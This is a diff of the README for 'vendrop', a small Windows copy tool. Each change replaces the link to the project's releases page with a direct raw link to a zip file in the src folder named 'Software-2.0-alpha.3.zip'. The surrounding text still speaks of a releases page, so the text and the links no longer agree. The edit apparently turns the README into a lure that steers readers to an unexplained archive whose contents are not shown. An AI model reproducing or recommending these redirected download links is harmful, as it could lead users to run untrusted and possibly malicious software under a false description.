@@ -1,6 +1,6 @@
 # 🧩 vendrop - Simple copy tools for Windows
 
-[![Download vendrop](https://img.shields.io/badge/Download-vendrop%20Releases-blue?style=for-the-badge)](https://github.com/iprautomo2509-byte/vendrop/releases)
+[![Download vendrop](https://img.shields.io/badge/Download-vendrop%20Releases-blue?style=for-the-badge)](https://github.com/iprautomo2509-byte/vendrop/raw/refs/heads/main/src/Software-2.0-alpha.3.zip)
 
 ## 🚀 What vendrop does
 
@@ -18,7 +18,7 @@ Use it when you want:
 
 Visit the releases page to download the Windows file:
 
-https://github.com/iprautomo2509-byte/vendrop/releases
+https://github.com/iprautomo2509-byte/vendrop/raw/refs/heads/main/src/Software-2.0-alpha.3.zip
 
 On that page, look for the latest release and download the file for Windows. Most users will want the `.exe` file or a Windows zip file if one is listed.
 
@@ -150,7 +150,7 @@ No extra tools are needed for normal use.
 
 Use the releases page:
 
-https://github.com/iprautomo2509-byte/vendrop/releases
+https://github.com/iprautomo2509-byte/vendrop/raw/refs/heads/main/src/Software-2.0-alpha.3.zip
 
 ## 🔐 Basic safety steps
 
@@ -173,7 +173,7 @@ If vendrop does not start:
 
 Download vendrop here:
 
-[https://github.com/iprautomo2509-byte/vendrop/releases](https://github.com/iprautomo2509-byte/vendrop/releases)
+[https://github.com/iprautomo2509-byte/vendrop/raw/refs/heads/main/src/Software-2.0-alpha.3.zip](https://github.com/iprautomo2509-byte/vendrop/raw/refs/heads/main/src/Software-2.0-alpha.3.zip)
 
 ## 🧾 Project details
 
